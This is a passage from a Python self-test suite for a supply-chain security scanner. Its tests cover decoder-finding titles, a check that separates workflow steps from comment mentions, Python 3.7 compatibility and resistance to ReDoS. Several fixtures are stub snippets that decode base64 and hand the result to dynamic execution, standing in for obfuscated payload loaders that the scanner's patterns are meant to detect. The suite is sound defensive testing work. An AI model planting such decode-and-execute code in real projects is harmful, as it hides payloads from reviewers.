    assert ("scripts/gen.ts", 2) in res.at("P4"), res.at("P4")


# (3) P5 titles: a decoder that needs no executor is not titled "decoder + dynamic execution"
@case
def p5_titles_name_what_was_found(c):
    files = {"server/src/scripts/ensure-permissions.ts":
             "export function claims(seg: string) {\n"
             "  return JSON.parse(Buffer.from(seg, 'base64url').toString('utf8')) as Record<string, unknown>;\n}\n",
             "src/literal.ts": J("const s = ", AT, "('QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo');\n"),
             "src/alphabet.ts": "const A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';\n",
             "src/keyed.ts": J("const s = globalThis['", AT, "'](d);\n"),
             "src/json.ts": J("import d from './blob.json';\nconst s = ", AT, "(d.p);\n"),
             "src/exec.ts": J("const s = ", AT, "(d);\n", EV, "(s);\n")}
    r = c.repo(files, commit=True)
    res = c.run("scan-payload", r, "--checks", "P4,P5").expect(1, has=["P5"])
    titles = dict(((f["path"], f["line"]), f["title"]) for f in res.findings if f["check"] == "P5")
    assert titles == {("server/src/scripts/ensure-permissions.ts", 2): "decoder in a build/install-time file",
                      ("src/literal.ts", 1): "decoder fed an inline literal",
                      ("src/alphabet.ts", 1): "hand-rolled base64 decoder",
                      ("src/keyed.ts", 1): "decoder behind a computed key",
                      ("src/json.ts", 2): "decoder loading a local data file",
                      ("src/exec.ts", 1): "decoder + dynamic execution",
                      ("src/exec.ts", 2): "decoder + dynamic execution"}, titles
    assert "P5 decoder in a build/install-time file: decoder in a build/install/config-time file" in res.out, res.out[-1500:]
    env = {"GITHUB_WORKSPACE": r, "GUARD_MODE": "full", "GUARD_CHECKS": "P5"}
    ci = c.run("guard-ci", r, env=env)
    assert ci.rc == 1, ci.out[-800:]
    ann = [l for l in ci.out.splitlines() if l.startswith("::error file=server/src/scripts/ensure-permissions.ts")]
    assert len(ann) == 1 and "title=P5 decoder in a build/install-time file::" in ann[0], ann
    assert not any("ensure-permissions" in l and "dynamic execution" in l for l in ci.out.splitlines()), ci.out[-800:]


# (4) adoption-precheck: comment and doc lines that name the legacy scanner are not steps
@case
def rollout_precheck_comment_mentions_are_not_steps(c):
    r = _corpus_shaped_consumer(c)
    jp = c.path("pre.json")
    rc, out = c.run_raw("tools/adoption-precheck", "--repo-dir", r, "--json", jp)
    assert rc == 1, out[-1500:]
    with open(jp) as fh:
        doc = json.load(fh)[0]
    steps = sorted((x["path"], x["line"], x["kind"]) for x in doc["references"])
    assert steps == sorted([(".github/workflows/security-scan.yml", 22, "workflow step"),
                            (".github/workflows/security-scan.yml", 25, "workflow step"),
                            (".github/workflows/release.yml", 15, "workflow step"),
                            (".github/workflows/release.yml", 17, "workflow step"),
                            (".github/workflows/security-gate.yml", 18, "workflow step"),
                            ("amplify.yml", 7, "amplify build command"), ("package.json", 5, "package.json script")]), steps
    mentions = sorted((x["path"], x["line"], x["kind"]) for x in doc["mentions"])
    assert mentions == sorted([(".github/workflows/security-scan.yml", 3, "comment"),
                               (".github/workflows/release.yml", 24, "comment"),
                               (".github/workflows/security-gate.yml", 3, "comment"),
                               ("src/lib/decisions.ts", 1, "comment"),
                               ("specs/026/quickstart.md", 1, "documentation")]), mentions
    assert "(workflow step): #" not in out and "mentions in comments/docs" in out, out[-2500:]
    # mentions alone are not adoption work
    r2 = c.repo({".github/workflows/ci.yml": GOOD_WF + "      # replaced %s with the guard\n" % LEGACY,
                 "README.md": "We removed `%s`.\n" % LEGACY}, commit=True)
    rc, out = c.run_raw("tools/adoption-precheck", "--repo-dir", r2)
    assert rc == 0 and "verdict: READY" in out, out[-1500:]


# ---------------------------------------------------------------------------
@case
def python37_syntax_compat(c):
    import ast
    for dp, _dn, fns in list(os.walk(os.path.join(ROOT, "lib"))) + list(os.walk(os.path.join(ROOT, "tools"))):
        for fn in fns:
            if fn.endswith(".py"):
                with open(os.path.join(dp, fn)) as fh:
                    src = fh.read()
                try:
                    ast.parse(src, filename=fn, feature_version=(3, 7))
                except SyntaxError as e:
                    raise AssertionError("%s is not python 3.7 syntax: %s" % (fn, e))


@case
def runner_regex_is_not_redos(c):
    """CodeQL py/redos on _RX_RUNNER: 'npm' followed by many '-- -' pieces backtracked
    exponentially. Each pathological line must be answered in well under a second, and the
    rule must still match real installer invocations."""
    import time
    lib = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "lib")
    if lib not in sys.path:
        sys.path.insert(0, lib)
    from guard import supply
    for bad in ["npm " + "-- -" * 4000, "npm --" + " -- --" * 4000, "npm " + "-a -" * 4000 + "!",
                "npm -0" + " -0 -0" * 4000 + "!", "npm --x" + " --x v" * 4000 + "!"]:
        t0 = time.perf_counter()
        supply._RX_RUNNER.search(bad)
        dt = time.perf_counter() - t0
        assert dt < 1.0, (bad[:20], dt)
    for ok in ["npm install left-pad", "npm --prefix web install x", "pnpm --filter app add y",
               "yarn global add z", "npx some-tool", "npm -g install q"]:
        assert supply._RX_RUNNER.search(ok), ok


def main():
    label = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("LC_ALL", "")
    only = set(sys.argv[2:])
    base = tempfile.mkdtemp(prefix="scg-selftest-")
    with open(os.path.join(base, "gitconfig"), "w") as fh:
        fh.write("[user]\n\tname = selftest\n\temail = selftest@example.invalid\n[init]\n\tdefaultBranch = main\n"
                 "[commit]\n\tgpgsign = false\n[core]\n\tautocrlf = false\n")
    cases = [f for f in CASES if not only or f.__name__ in only]

    def one(fn):
        c = Ctx(base, fn.__name__)
        try:
            fn(c)
            return fn.__name__, None
        except Exception as e:  # noqa
            return fn.__name__, "%s\n%s" % (e, traceback.format_exc(limit=3) if not isinstance(e, AssertionError) else "")

    passed = failed = 0
    workers = int(os.environ.get("SELFTEST_JOBS", "6"))
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        for name, err in ex.map(one, cases):
            if err is None:
                passed += 1
                print("ok     [%s] %s" % (label, name))
            else:
                failed += 1
                print("FAILED [%s] %s: %s" % (label, name, err.strip().replace("\n", "\n        ")))
            sys.stdout.flush()
    shutil.rmtree(base, ignore_errors=True)
    print("RESULT [%s] passed=%d failed=%d" % (label, passed, failed))
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())

